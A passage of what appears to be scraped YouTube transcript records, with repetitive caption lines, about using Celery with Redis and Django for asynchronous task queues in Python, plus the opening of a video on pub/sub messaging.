application can actually be found. And then in the settings, this is\nfound. And then in the settings, this is\nfound. And then in the settings, this is also very important. We define salary\nalso very important. We define salary\nalso very important. We define salary broker URL, salary result backend which\nbroker URL, salary result backend which\nbroker URL, salary result backend which is going to be part of the end file. We\nis going to be part of the end file. We\nis going to be part of the end file. We define the salary time zone and the\ndefine the salary time zone and the\ndefine the salary time zone and the salary enable UTC. Now this is\nsalary enable UTC. Now this is\nsalary enable UTC. Now this is important. I'm not going to show you the\nimportant. I'm not going to show you the\nimportant. I'm not going to show you the N file here, but what you need to do is\nN file here, but what you need to do is\nN file here, but what you need to do is you need to specify Django-d.\nyou need to specify Django-d.\nyou need to specify Django-d. So this is going to be Django DB as the\nSo this is going to be Django DB as the\nSo this is going to be Django DB as the actual backend. So instead of the\nactual backend. So instead of the\nactual backend. So instead of the reddest string, you just provide\nreddest string, you just provide\nreddest string, you just provide Django-d\nDjango-d\nDjango-d uh for the salary backend URL. You will\nuh for the salary backend URL. You will\nuh for the salary backend URL. You will also find the N file without all my keys\nalso find the N file without all my keys\nalso find the N file without all my keys in there in the GitHub example. And then\nin there in the GitHub example. And then\nin there in the GitHub example. And then basically in your application, you\nbasically in your application, you\nbasically in your application, you define the tasks in tasks. py. Here we\ndefine the tasks in tasks. py. Here we\ndefine the tasks in tasks. py. Here we use share task because we're using this\nuse share task because we're using this\nuse share task because we're using this in a reusable instance or in uh in a\nin a reusable instance or in uh in a\nin a reusable instance or in uh in a file that is part of the Django\nfile that is part of the Django\nfile that is part of the Django application. So in this case we don't\napplication. So in this case we don't\napplication. So in this case we don't say task we say share task and it\nsay task we say share task and it\nsay task we say share task and it basically picks whatever worker it has\nbasically picks whatever worker it has\nbasically picks whatever worker it has or is available right now. Then we\nor is available right now. Then we\nor is available right now. Then we define here the movie info function. We\ndefine here the movie info function. We\ndefine here the movie info function. We do the same structured output as before.\ndo the same structured output as before.\ndo the same structured output as before. And there's a couple of things that you\nAnd there's a couple of things that you\nAnd there's a couple of things that you need to change here and there. I'm not\nneed to change here and there. I'm not\nneed to change here and there. I'm not going to show absolutely everything here\ngoing to show absolutely everything here\ngoing to show absolutely everything here but the result of all this if you\nbut the result of all this if you\nbut the result of all this if you actually run this is going to be the\nactually run this is going to be the\nactually run this is going to be the following. Docker compose up-built.\nfollowing. Docker compose up-built.\nfollowing. Docker compose up-built. Now everything should be running on port\nNow everything should be running on port\nNow everything should be running on port 8000. If this is running correctly, you\n8000. If this is running correctly, you\n8000. If this is running correctly, you see all this output. Then it's running\nsee all this output. Then it's running\nsee all this output. Then it's running on port 8000. And you can say, tell me\non port 8000. And you can say, tell me\non port 8000. And you can say, tell me about Shutter Island. Submit. This is\nabout Shutter Island. Submit. This is\nabout Shutter Island. Submit. This is now going to show a task status page\nnow going to show a task status page\nnow going to show a task status page with a task ID processing pending. And\nwith a task ID processing pending. And\nwith a task ID processing pending. And when I reload, if the task is completed,\nwhen I reload, if the task is completed,\nwhen I reload, if the task is completed, it will show the result here. Very\nit will show the result here. Very\nit will show the result here. Very simple example. I'm not going to go\nsimple example. I'm not going to go\nsimple example. I'm not going to go through every single line of code here.\nthrough every single line of code here.\nthrough every single line of code here. But you can look at the code on the\nBut you can look at the code on the\nBut you can look at the code on the GitHub repository or in the GitHub\nGitHub repository or in the GitHub\nGitHub repository or in the GitHub repository. And if you are interested in\nrepository. And if you are interested in\nrepository. And if you are interested in a detailed Django Celery Rabbit MQ\na detailed Django Celery Rabbit MQ\na detailed Django Celery Rabbit MQ integration tutorial, let me know in the\nintegration tutorial, let me know in the\nintegration tutorial, let me know in the comment section down below. So that's it\ncomment section down below. So that's it\ncomment section down below. So that's it for today's video. I hope you enjoyed it\nfor today's video. I hope you enjoyed it\nfor today's video. I hope you enjoyed it and hope you learned something. If so,\nand hope you learned something. If so,\nand hope you learned something. If so, let me know by hitting a like button and\nlet me know by hitting a like button and\nlet me know by hitting a like button and leaving a comment in the comment section\nleaving a comment in the comment section\nleaving a comment in the comment section down below. Also, something that I\ndown below. Also, something that I\ndown below. Also, something that I usually don't really mention in my\nusually don't really mention in my\nusually don't really mention in my videos is I have a service page on my\nvideos is I have a service page on my\nvideos is I have a service page on my website. If you're interested in private\nwebsite. If you're interested in private\nwebsite. If you're interested in private tutoring or if you're interested in\ntutoring or if you're interested in\ntutoring or if you're interested in consulting or freelancing services, you\nconsulting or freelancing services, you\nconsulting or freelancing services, you might want to check that out. I just\nmight want to check that out. I just\nmight want to check that out. I just thought I could start mentioning this at\nthought I could start mentioning this at\nthought I could start mentioning this at the end of my videos. So, if you're\nthe end of my videos. So, if you're\nthe end of my videos. So, if you're interested in that, check out my page\ninterested in that, check out my page\ninterested in that, check out my page and specifically the services page. And\nand specifically the services page. And\nand specifically the services page. And besides that, don't forget to subscribe\nbesides that, don't forget to subscribe\nbesides that, don't forget to subscribe and hit the notification bell to not\nand hit the notification bell to not\nand hit the notification bell to not miss a single future video for free.\nmiss a single future video for free.\nmiss a single future video for free. Other than that, thank you much for\nOther than that, thank you much for\nOther than that, thank you much for watching. See you in the next video and\nwatching. See you in the next video and\nwatching. See you in the next video and bye."
  },
  {
    "id": 60491638,
    "timestamp": "2026-02-23T00:14:51.662Z",
    "title": "Getting Started With Celery: Asynchronous Tasks in Python",
    "url": "https://www.youtube.com/watch?v=VRHVEporra0",
    "text": "as your python apps become more\nas your python apps become more complicated you'll need a task CU celery\ncomplicated you'll need a task CU celery\ncomplicated you'll need a task CU celery is probably the most popular task CU in\nis probably the most popular task CU in\nis probably the most popular task CU in Python and in this video I'll show you\nPython and in this video I'll show you\nPython and in this video I'll show you how to get started with it what is a\nhow to get started with it what is a\nhow to get started with it what is a task q a task Q is a way for you to\ntask q a task Q is a way for you to\ntask q a task Q is a way for you to offload time intensive processing\noffload time intensive processing\noffload time intensive processing intensive or unreliable tasks to a\nintensive or unreliable tasks to a\nintensive or unreliable tasks to a separate process so your main process\nseparate process so your main process\nseparate process so your main process doesn't get blocked let me show you how\ndoesn't get blocked let me show you how\ndoesn't get blocked let me show you how easy it is to use okay so to get started\neasy it is to use okay so to get started\neasy it is to use okay so to get started with celery I need to install it so I\nwith celery I need to install it so I\nwith celery I need to install it so I have a virtual environment set up\nhave a virtual environment set up\nhave a virtual environment set up already so I'll just install it with Pip\nalready so I'll just install it with Pip\nalready so I'll just install it with Pip so pip install\nso pip install\nso pip install celery and then also I need to install a\ncelery and then also I need to install a\ncelery and then also I need to install a driver for the task Q or the broker that\ndriver for the task Q or the broker that\ndriver for the task Q or the broker that I'll be using so the idea behind the\nI'll be using so the idea behind the\nI'll be using so the idea behind the task Q is my python app will send a\ntask Q is my python app will send a\ntask Q is my python app will send a message to the task q and then celery\nmessage to the task q and then celery\nmessage to the task q and then celery will be listening to the task Q to\nwill be listening to the task Q to\nwill be listening to the task Q to figure out what it needs to run so for\nfigure out what it needs to run so for\nfigure out what it needs to run so for my task Q I'm going to use something\nmy task Q I'm going to use something\nmy task Q I'm going to use something called reddis and reddis is an in-memory\ncalled reddis and reddis is an in-memory\ncalled reddis and reddis is an in-memory database store so this install here in\ndatabase store so this install here in\ndatabase store so this install here in PIP is for the driver so for python to\nPIP is for the driver so for python to\nPIP is for the driver so for python to connect to it but I need the actual\nconnect to it but I need the actual\nconnect to it but I need the actual reddest instance so I'm going to use\nreddest instance so I'm going to use\nreddest instance so I'm going to use Docker composed to create it so if\nDocker composed to create it so if\nDocker composed to create it so if you're not familiar with Docker it's\nyou're not familiar with Docker it's\nyou're not familiar with Docker it's just a way of creating things called\njust a way of creating things called\njust a way of creating things called containers that basically run one thing\ncontainers that basically run one thing\ncontainers that basically run one thing so I'm going to create a container that\nso I'm going to create a container that\nso I'm going to create a container that runs one thing and that one thing is\nruns one thing and that one thing is\nruns one thing and that one thing is redis I'm going to create another\nredis I'm going to create another\nredis I'm going to create another container that runs something called\ncontainer that runs something called\ncontainer that runs something called redis commander redis commander is just\nredis commander redis commander is just\nredis commander redis commander is just a tool that allows me to look inside of\na tool that allows me to look inside of\na tool that allows me to look inside of a redis instance so we can visually see\na redis instance so we can visually see\na redis instance so we can visually see what's going on and I'll show you that a\nwhat's going on and I'll show you that a\nwhat's going on and I'll show you that a little later in the video but the point\nlittle later in the video but the point\nlittle later in the video but the point is here I have have reddis on Port 6379\nis here I have have reddis on Port 6379\nis here I have have reddis on Port 6379 and my celery app will be able to\nand my celery app will be able to\nand my celery app will be able to connect to that so let me go ahead and\nconnect to that so let me go ahead and\nconnect to that so let me go ahead and start it I can just do Docker compose\nstart it I can just do Docker compose\nstart it I can just do Docker compose up- D I have Docker desktop installed so\nup- D I have Docker desktop installed so\nup- D I have Docker desktop installed so that's why I can just do Docker compose\nthat's why I can just do Docker compose\nthat's why I can just do Docker compose up- D if you had Docker desktop\nup- D if you had Docker desktop\nup- D if you had Docker desktop installed and you had this file then you\ninstalled and you had this file then you\ninstalled and you had this file then you can just run the same command and then\ncan just run the same command and then\ncan just run the same command and then redis is going to be running on your\nredis is going to be running on your\nredis is going to be running on your computer it's that simple so let me\ncomputer it's that simple so let me\ncomputer it's that simple so let me close this and let me go to task stopy\nclose this and let me go to task stopy\nclose this and let me go to task stopy and what I'll do is I'll import from\nand what I'll do is I'll import from\nand what I'll do is I'll import from celery\ncelery\ncelery Capital C celery so celery class is\nCapital C celery so celery class is\nCapital C celery so celery class is being imported from the celery library\nbeing imported from the celery library\nbeing imported from the celery library and what I want to do is I want to\nand what I want to do is I want to\nand what I want to do is I want to create something called a celery app so\ncreate something called a celery app so\ncreate something called a celery app so the celery app is just me defining like\nthe celery app is just me defining like\nthe celery app is just me defining like how celery is going to work in this\nhow celery is going to work in this\nhow celery is going to work in this particular instance so the first\nparticular instance so the first\nparticular instance so the first argument is going to be the name of the\nargument is going to be the name of the\nargument is going to be the name of the celery instance I'm going to call it\ncelery instance I'm going to call it\ncelery instance I'm going to call it tasks to match the name of my file it\ntasks to match the name of my file it\ntasks to match the name of my file it just makes a lot easier if it matches\njust makes a lot easier if it matches\njust makes a lot easier if it matches the name of the file here in a more\nthe name of the file here in a more\nthe name of the file here in a more complicated setup you can use a\ncomplicated setup you can use a\ncomplicated setup you can use a different name but in my case I'm just\ndifferent name but in my case I'm just\ndifferent name but in my case I'm just going to make it the name of the file\ngoing to make it the name of the file\ngoing to make it the name of the file and then I need to pass in a broker so\nand then I need to pass in a broker so\nand then I need to pass in a broker so the broker is going to be reddis and I\nthe broker is going to be reddis and I\nthe broker is going to be reddis and I need to pass in basically like a URL for\nneed to pass in basically like a URL for\nneed to pass in basically like a URL for it so this starts off with reddis and\nit so this starts off with reddis and\nit so this starts off with reddis and then colon SL slash and then the\nthen colon SL slash and then the\nthen colon SL slash and then the location of it so it's going to be Local\nlocation of it so it's going to be Local\nlocation of it so it's going to be Local Host and then 6379 because it's running\nHost and then 6379 because it's running\nHost and then 6379 because it's running on my computer I could have this running\non my computer I could have this running\non my computer I could have this running on some remote server then I would just\non some remote server then I would just\non some remote server then I would just need a different uh location for it but\nneed a different uh location for it but\nneed a different uh location for it but because it's on my local machine I can\nbecause it's on my local machine I can\nbecause it's on my local machine I can say it's running on Local Host so once I\nsay it's running on Local Host so once I\nsay it's running on Local Host so once I have that then then I can define a\nhave that then then I can define a\nhave that then then I can define a celery task so to define a celery task\ncelery task so to define a celery task\ncelery task so to define a celery task in this case I can take the app object\nin this case I can take the app object\nin this case I can take the app object here make it a decorator to put the at\nhere make it a decorator to put the at\nhere make it a decorator to put the at sign in front of it and then do do task\nsign in front of it and then do do task\nsign in front of it and then do do task and then what follows is a function that\nand then what follows is a function that\nand then what follows is a function that will act as a task inside of celery so\nwill act as a task inside of celery so\nwill act as a task inside of celery so I'll be able to run this function\nI'll be able to run this function\nI'll be able to run this function through celery instead of my task stop\nthrough celery instead of my task stop\nthrough celery instead of my task stop Pi here and I'll show you both cases in\nPi here and I'll show you both cases in\nPi here and I'll show you both cases in just a second but let me create this\njust a second but let me create this\njust a second but let me create this task first so I'll call it process is\ntask first so I'll call it process is\ntask first so I'll call it process is going to take in two values and what I\ngoing to take in two values and what I\ngoing to take in two values and what I want to do is I want to make this sleep\nwant to do is I want to make this sleep\nwant to do is I want to make this sleep to kind of simulate a slow running\nto kind of simulate a slow running\nto kind of simulate a slow running process so I'll say from time import\nprocess so I'll say from time import\nprocess so I'll say from time import sleep and inside of here I'll sleep for\nsleep and inside of here I'll sleep for\nsleep and inside of here I'll sleep for 1 second actually I'll do that inside of\n1 second actually I'll do that inside of\n1 second actually I'll do that inside of a loop so let's say while uh some\na loop so let's say while uh some\na loop so let's say while uh some counter is less than five I'll sleep for\ncounter is less than five I'll sleep for\ncounter is less than five I'll sleep for one second and I'll initialize the\none second and I'll initialize the\none second and I'll initialize the counter here as zero and I'll increment\ncounter here as zero and I'll increment\ncounter here as zero and I'll increment the counter and then I'll print like\nthe counter and then I'll print like\nthe counter and then I'll print like processing so we can visually see\nprocessing so we can visually see\nprocessing so we can visually see something happening and then at the end\nsomething happening and then at the end\nsomething happening and then at the end I'll just return let's say x^2 + y^2\nI'll just return let's say x^2 + y^2\nI'll just return let's say x^2 + y^2 right so first let me run this as a\nright so first let me run this as a\nright so first let me run this as a regular function so I'll do Python dasi\nregular function so I'll do Python dasi\nregular function so I'll do Python dasi and then task stop high and then I'll\nand then task stop high and then I'll\nand then task stop high and then I'll just call process with two and three so\njust call process with two and three so\njust call process with two and three so I'm running it and we see here uh it's\nI'm running it and we see here uh it's\nI'm running it and we see here uh it's printing processing and then it's\nprinting processing and then it's\nprinting processing and then it's eventually going to return so we see\neventually going to return so we see\neventually going to return so we see there it returns 13 so imagine this were\nthere it returns 13 so imagine this were\nthere it returns 13 so imagine this were in a web app for example and the user\nin a web app for example and the user\nin a web app for example and the user clicked on a link you wouldn't want this\nclicked on a link you wouldn't want this\nclicked on a link you wouldn't want this process to be running to generate the\nprocess to be running to generate the\nprocess to be running to generate the page because the user would sit there\npage because the user would sit there\npage because the user would sit there and have to wait so what you can do is\nand have to wait so what you can do is\nand have to wait so what you can do is you can offload this work to celery and\nyou can offload this work to celery and\nyou can offload this work to celery and then you can return a response to the\nthen you can return a response to the\nthen you can return a response to the user immediately so let me exit out of\nuser immediately so let me exit out of\nuser immediately so let me exit out of this and let me start up Celery so I\nthis and let me start up Celery so I\nthis and let me start up Celery so I have this other terminal open it's\nhave this other terminal open it's\nhave this other terminal open it's bigger here so we can see everything\nbigger here so we can see everything\nbigger here so we can see everything that's running so what I need to do is I\nthat's running so what I need to do is I\nthat's running so what I need to do is I need to start celery so I can use the\nneed to start celery so I can use the\nneed to start celery so I can use the celery command so celery and then - A\ncelery command so celery and then - A\ncelery command so celery and then - A and then the name of the file with the\nand then the name of the file with the\nand then the name of the file with the celery app in it so\ncelery app in it so\ncelery app in it so tasks and then I need to do worker which\ntasks and then I need to do worker which\ntasks and then I need to do worker which says I'm going to create a celery worker\nsays I'm going to create a celery worker\nsays I'm going to create a celery worker from tasks.py and then I want to add\nfrom tasks.py and then I want to add\nfrom tasks.py and then I want to add some loging so I'll do - L and then I'll\nsome loging so I'll do - L and then I'll\nsome loging so I'll do - L and then I'll do info as the logging level so I can\ndo info as the logging level so I can\ndo info as the logging level so I can see everything now hit enter and now\nsee everything now hit enter and now\nsee everything now hit enter and now what I see is all this information about\nwhat I see is all this information about\nwhat I see is all this information about my salary instance but what's important\nmy salary instance but what's important\nmy salary instance but what's important here is the transport so the transport\nhere is the transport so the transport\nhere is the transport so the transport here is reddis and then logo host 6379\nhere is reddis and then logo host 6379\nhere is reddis and then logo host 6379 so that's exactly what I set up and then\nso that's exactly what I set up and then\nso that's exactly what I set up and then here are the tasks that I have set up so\nhere are the tasks that I have set up so\nhere are the tasks that I have set up so I only have one Tas task because I\nI only have one Tas task because I\nI only have one Tas task because I decorated process with app. task so\ndecorated process with app. task so\ndecorated process with app. task so celery has it available so you have to\ncelery has it available so you have to\ncelery has it available so you have to be able to see the task here before you\nbe able to see the task here before you\nbe able to see the task here before you can run it so now let me scroll down to\ncan run it so now let me scroll down to\ncan run it so now let me scroll down to the bottom so we see nothing is\nthe bottom so we see nothing is\nthe bottom so we see nothing is happening with celery so let me start\nhappening with celery so let me start\nhappening with celery so let me start up the python reppel again and just to\nup the python reppel again and just to\nup the python reppel again and just to recap if I do process like this it still\nrecap if I do process like this it still\nrecap if I do process like this it still processes in the same location so it's\nprocesses in the same location so it's\nprocesses in the same location so it's processing in this repple here but if I\nprocessing in this repple here but if I\nprocessing in this repple here but if I want to run it in the background what I\nwant to run it in the background what I\nwant to run it in the background what I can do is I can do process delay and\ncan do is I can do process delay and\ncan do is I can do process delay and then pass in the same arguments so it's\nthen pass in the same arguments so it's\nthen pass in the same arguments so it's the same same function name same\nthe same same function name same\nthe same same function name same arguments but I'm just putting a delay\narguments but I'm just putting a delay\narguments but I'm just putting a delay after the function name and then I hit\nafter the function name and then I hit\nafter the function name and then I hit enter Then what we see here is I get a\nenter Then what we see here is I get a\nenter Then what we see here is I get a async result and if you notice here in\nasync result and if you notice here in\nasync result and if you notice here in the accelery terminal it's now doing\nthe accelery terminal it's now doing\nthe accelery terminal it's now doing some work so we see here it's printing\nsome work so we see here it's printing\nsome work so we see here it's printing out the processing and then it tells me\nout the processing and then it tells me\nout the processing and then it tells me what the result is 13 and then it tells\nwhat the result is 13 and then it tells\nwhat the result is 13 and then it tells me it took about 5 Seconds to run that\nme it took about 5 Seconds to run that\nme it took about 5 Seconds to run that because I have to sleep for 5 seconds so\nbecause I have to sleep for 5 seconds so\nbecause I have to sleep for 5 seconds so if this were like a real app the celery\nif this were like a real app the celery\nif this were like a real app the celery process will be running somewhere else\nprocess will be running somewhere else\nprocess will be running somewhere else and it will just be waiting for any\nand it will just be waiting for any\nand it will just be waiting for any tasks to appear on the Queue it will\ntasks to appear on the Queue it will\ntasks to appear on the Queue it will take those tasks and run them for you\ntake those tasks and run them for you\ntake those tasks and run them for you and then do whatever needs to be done so\nand then do whatever needs to be done so\nand then do whatever needs to be done so in this case it's just returning 13 but\nin this case it's just returning 13 but\nin this case it's just returning 13 but of course you can do things like send\nof course you can do things like send\nof course you can do things like send emails you can add something to a\nemails you can add something to a\nemails you can add something to a database you can process some files\ndatabase you can process some files\ndatabase you can process some files whatever it is um normally things that\nwhatever it is um normally things that\nwhatever it is um normally things that take a while that would block uh the\ntake a while that would block uh the\ntake a while that would block uh the typical user using your app you can have\ntypical user using your app you can have\ntypical user using your app you can have those run in celery so the user doesn't\nthose run in celery so the user doesn't\nthose run in celery so the user doesn't have to worry about waiting for those\nhave to worry about waiting for those\nhave to worry about waiting for those things to complete so now let me open up\nthings to complete so now let me open up\nthings to complete so now let me open up redis commanders so remember it's\nredis commanders so remember it's\nredis commanders so remember it's running on 8081 so I'll go to my browser\nrunning on 8081 so I'll go to my browser\nrunning on 8081 so I'll go to my browser here and I'll go to Local Host\nhere and I'll go to Local Host\nhere and I'll go to Local Host 8081 okay so we see here this is my\n8081 okay so we see here this is my\n8081 okay so we see here this is my reddis incense and it has some things\nreddis incense and it has some things\nreddis incense and it has some things for celery here that I don't have to\nfor celery here that I don't have to\nfor celery here that I don't have to worry about what I'm more concerned with\nworry about what I'm more concerned with\nworry about what I'm more concerned with are the tasks that are available here so\nare the tasks that are available here so\nare the tasks that are available here so because this runs so quickly I won't be\nbecause this runs so quickly I won't be\nbecause this runs so quickly I won't be able to see anything in red as Commander\nable to see anything in red as Commander\nable to see anything in red as Commander but if I save the result of the task to\nbut if I save the result of the task to\nbut if I save the result of the task to reddis then I'll be able to see it in\nreddis then I'll be able to see it in\nreddis then I'll be able to see it in redis command matter so normally when\nredis command matter so normally when\nredis command matter so normally when you run it like this where you just have\nyou run it like this where you just have\nyou run it like this where you just have a broker you're going to put the task on\na broker you're going to put the task on\na broker you're going to put the task on the Queue and then celery will run the\nthe Queue and then celery will run the\nthe Queue and then celery will run the task and then basically forgets about it\ntask and then basically forgets about it\ntask and then basically forgets about it so it would depend on your process or\nso it would depend on your process or\nso it would depend on your process or whatever the task is doing some work\nwhatever the task is doing some work\nwhatever the task is doing some work that has some kind of effect if you just\nthat has some kind of effect if you just\nthat has some kind of effect if you just do something like this where you return\ndo something like this where you return\ndo something like this where you return a value then this value is going to be\na value then this value is going to be\na value then this value is going to be lost forever because there's nothing\nlost forever because there's nothing\nlost forever because there's nothing that's holding on to it so what I can do\nthat's holding on to it so what I can do\nthat's holding on to it so what I can do is I can set up something called a\nis I can set up something called a\nis I can set up something called a backend and that's just the location\nbackend and that's just the location\nbackend and that's just the location where it saves the results and I can\nwhere it saves the results and I can\nwhere it saves the results and I can actually save the results to reddis as\nactually save the results to reddis as\nactually save the results to reddis as well which is the most convenient in\nwell which is the most convenient in\nwell which is the most convenient in this situation and then let me just\nthis situation and then let me just\nthis situation and then let me just restart this and let me restart celery\nrestart this and let me restart celery\nrestart this and let me restart celery since I updated the backend so contrl C\nsince I updated the backend so contrl C\nsince I updated the backend so contrl C and then I'll just run the command again\nand then I'll just run the command again\nand then I'll just run the command again and now we see results here also has\nand now we see results here also has\nand now we see results here also has reddis local hosts so back here in my\nreddis local hosts so back here in my\nreddis local hosts so back here in my repple at the bottom I'll call process.\nrepple at the bottom I'll call process.\nrepple at the bottom I'll call process. delay again with two and three and hit\ndelay again with two and three and hit\ndelay again with two and three and hit enter so we get this async result here\nenter so we get this async result here\nenter so we get this async result here and then we see processing and if I go\nand then we see processing and if I go\nand then we see processing and if I go over to redis Commander and refresh we\nover to redis Commander and refresh we\nover to redis Commander and refresh we see this celery task meta here and we\nsee this celery task meta here and we\nsee this celery task meta here and we see status success result 13 and then\nsee status success result 13 and then\nsee status success result 13 and then some other information so this task was\nsome other information so this task was\nsome other information so this task was able to run successfully if it had\nable to run successfully if it had\nable to run successfully if it had failed it would say like failure um if\nfailed it would say like failure um if\nfailed it would say like failure um if it were pending it would say pending and\nit were pending it would say pending and\nit were pending it would say pending and then if it had any other status it would\nthen if it had any other status it would\nthen if it had any other status it would say that but since this is Success it\nsay that but since this is Success it\nsay that but since this is Success it has a result 13 so now let me go back\nhas a result 13 so now let me go back\nhas a result 13 so now let me go back here and it's nice to have the results\nhere and it's nice to have the results\nhere and it's nice to have the results stored in reddis but what if I want to\nstored in reddis but what if I want to\nstored in reddis but what if I want to use it somewhere in my app so what I can\nuse it somewhere in my app so what I can\nuse it somewhere in my app so what I can do is I can get that so there are a\ndo is I can get that so there are a\ndo is I can get that so there are a couple ways I can get it so first let me\ncouple ways I can get it so first let me\ncouple ways I can get it so first let me show you how I can do it here I can do\nshow you how I can do it here I can do\nshow you how I can do it here I can do process. delay and then I can do result.\nprocess. delay and then I can do result.\nprocess. delay and then I can do result. getet right so this is waiting and it's\ngetet right so this is waiting and it's\ngetet right so this is waiting and it's waiting and then once everything\nwaiting and then once everything\nwaiting and then once everything finishes up here it returns 13 but if I\nfinishes up here it returns 13 but if I\nfinishes up here it returns 13 but if I do it again result. we see it returns 13\ndo it again result. we see it returns 13\ndo it again result. we see it returns 13 immediately because in the first case it\nimmediately because in the first case it\nimmediately because in the first case it was waiting for the celery task to\nwas waiting for the celery task to\nwas waiting for the celery task to finish running but in the second case\nfinish running but in the second case\nfinish running but in the second case because it's already done and it's\nbecause it's already done and it's\nbecause it's already done and it's successful I can immediately return the\nsuccessful I can immediately return the\nsuccessful I can immediately return the value but notice that if I call doget\nvalue but notice that if I call doget\nvalue but notice that if I call doget this way it basically goes back to the\nthis way it basically goes back to the\nthis way it basically goes back to the original version where I had to wait\noriginal version where I had to wait\noriginal version where I had to wait well I don't want to have to wait so\nwell I don't want to have to wait so\nwell I don't want to have to wait so what I want to do is I want to be able\nwhat I want to do is I want to be able\nwhat I want to do is I want to be able to get the results of something that has\nto get the results of something that has\nto get the results of something that has run before so what I can do is let me\nrun before so what I can do is let me\nrun before so what I can do is let me let me just\nlet me just\nlet me just run process delay with like five and two\nrun process delay with like five and two\nrun process delay with like five and two so I get a different result right and we\nso I get a different result right and we\nso I get a different result right and we see I get this ID so I'm going to copy\nsee I get this ID so I'm going to copy\nsee I get this ID so I'm going to copy this ID and just to show you this is\nthis ID and just to show you this is\nthis ID and just to show you this is working I'm going to exit completely out\nworking I'm going to exit completely out\nworking I'm going to exit completely out of here and then I'm going to go back\nof here and then I'm going to go back\nof here and then I'm going to go back into task with the repple and then what\ninto task with the repple and then what\ninto task with the repple and then what I can do is I can do result equals and\nI can do is I can do result equals and\nI can do is I can do result equals and then I take the process task the\nthen I take the process task the\nthen I take the process task the function and instead of delay or\nfunction and instead of delay or\nfunction and instead of delay or anything like that I'm going to do async\nanything like that I'm going to do async\nanything like that I'm going to do async result and then I'm going to pass the ID\nresult and then I'm going to pass the ID\nresult and then I'm going to pass the ID that I copied as a\nthat I copied as a\nthat I copied as a string and now I have results and I can\nstring and now I have results and I can\nstring and now I have results and I can do things like dot ready it says true if\ndo things like dot ready it says true if\ndo things like dot ready it says true if I\nI\nI do ready if I do status it tells me\ndo ready if I do status it tells me\ndo ready if I do status it tells me success and if I want the result I get\nsuccess and if I want the result I get\nsuccess and if I want the result I get 29 and the reason why I can do this is\n29 and the reason why I can do this is\n29 and the reason why I can do this is because it is stored in Reddit if I\nbecause it is stored in Reddit if I\nbecause it is stored in Reddit if I refresh we see a couple more here's the\nrefresh we see a couple more here's the\nrefresh we see a couple more here's the task that I just got the result for we\ntask that I just got the result for we\ntask that I just got the result for we see the result is 29 here and it's\nsee the result is 29 here and it's\nsee the result is 29 here and it's success so this is the basic process\nsuccess so this is the basic process\nsuccess so this is the basic process with celery as you can see the celery\nwith celery as you can see the celery\nwith celery as you can see the celery part is pretty simple to set up really\npart is pretty simple to set up really\npart is pretty simple to set up really what matters is what your task is\nwhat matters is what your task is\nwhat matters is what your task is because that's where the work is and of\nbecause that's where the work is and of\nbecause that's where the work is and of course that depends on what your project\ncourse that depends on what your project\ncourse that depends on what your project is what you need to be run in the\nis what you need to be run in the\nis what you need to be run in the background but for accelery itself you\nbackground but for accelery itself you\nbackground but for accelery itself you can see it's pretty easy to set up you\ncan see it's pretty easy to set up you\ncan see it's pretty easy to set up you just set up a broker a backend and then\njust set up a broker a backend and then\njust set up a broker a backend and then you'll be able to run any task that you\nyou'll be able to run any task that you\nyou'll be able to run any task that you define I can Define as many tasks as I\ndefine I can Define as many tasks as I\ndefine I can Define as many tasks as I need and I can run them in the\nneed and I can run them in the\nneed and I can run them in the background in my project whenever it's\nbackground in my project whenever it's\nbackground in my project whenever it's necessary so that was enough to get you\nnecessary so that was enough to get you\nnecessary so that was enough to get you started with celery by itself but celery\nstarted with celery by itself but celery\nstarted with celery by itself but celery really shines when you use it with a web\nreally shines when you use it with a web\nreally shines when you use it with a web framework like flask or Jango check out\nframework like flask or Jango check out\nframework like flask or Jango check out the other videos on my channel to learn\nthe other videos on my channel to learn\nthe other videos on my channel to learn how to use celery with those Frameworks"
  },
  {
    "id": 60491641,
    "timestamp": "2026-02-23T00:14:53.159Z",
    "title": "Python Celery Distributed Task Queue | End to End Application with Celery",
    "url": "https://www.youtube.com/watch?v=b2kdhkUXI2U",
    "text": "what comes to your mind when you hear\nwhat comes to your mind when you hear about softwares like rabbit mq Apache\nabout softwares like rabbit mq Apache\nabout softwares like rabbit mq Apache Kafka Kinesis or any other Pub sub\nKafka Kinesis or any other Pub sub\nKafka Kinesis or any other Pub sub library or framework what is the one\nlibrary or framework what is the one\nlibrary or framework what is the one thing that is common amongst them let me\nthing that is common amongst them let me\nthing that is common amongst them let me answer this question for you all of\nanswer this question for you all of\nanswer this question for you all of these softwares can be categorized in\nthese softwares can be categorized in\nthese softwares can be categorized in terms of their capability of event\nterms of their capability of event\nterms of their capability of event streaming message cues or publish\nstreaming message cues or publish\nstreaming message cues or publish subscribe framework or architecture\nsubscribe framework or architecture\nsubscribe framework or architecture which is used for connecting between two\nwhich is used for connecting between two\nwhich is used for connecting between two different set of systems two different\ndifferent set of systems two different\ndifferent set of systems two different set of systems I know this is not the\nset of systems I know this is not the\nset of systems I know this is not the perfect definition of it but this is the\nperfect definition of it but this is the\nperfect definition of it but this is the purpose because of which we make use of\npurpose because of which we make use of\npurpose because of which we make use of these things is to connect between two\nthese things is to connect between two\nthese things is to connect between two disconnected systems two disconnected\ndisconnected systems two disconnected\ndisconnected systems two disconnected machines they communicate via these\nmachines they communicate via these\nmachines they communicate via these softwares or libraries or Frameworks and\nsoftwares or libraries or Frameworks and\nsoftwares or libraries or Frameworks and why we make use of all these things as a\nwhy we make use of all these things as a\nwhy we make use of all these things as a an example let's assume that you have\nan example let's assume that you have\nan example let's assume that you have created a banking transaction system\ncreated a banking transaction system\ncreated a banking transaction system whenever a customer comes to your\nwhenever a customer comes to your\nwhenever a customer comes to your banking system and does some transaction\nbanking system and does some transaction\nbanking system and does some transaction you know the customer receives an SMS\nyou know the customer receives an SMS\nyou know the customer receives an SMS after some time after some time could be\nafter some time after some time could be\nafter some time after some time could be you know half a second 1 second to maybe\nyou know half a second 1 second to maybe\nyou know half a second 1 second to maybe even 10 15 seconds or a minute but it\neven 10 15 seconds or a minute but it\neven 10 15 seconds or a minute but it doesn't makes a difference as long as\ndoesn't makes a difference as long as\ndoesn't makes a difference as long as it's within a time limit now what\nit's within a time limit now what\nit's within a time limit now what happens here is that the system which\nhappens here is that the system which\nhappens here is that the system which does your transaction is is not\ndoes your transaction is is not\ndoes your transaction is is not responsible for sending the SMS to you\nresponsible for sending the SMS to you\nresponsible for sending the SMS to you the task of sending the SMS is being\nthe task of sending the SMS is being\nthe task of sending the SMS is being outsourced to some other entity because\noutsourced to some other entity because\noutsourced to some other entity because the system which is running your\nthe system which is running your\nthe system which is running your transaction system don't want to add\ntransaction system don't want to add\ntransaction system don't want to add additional software load by running 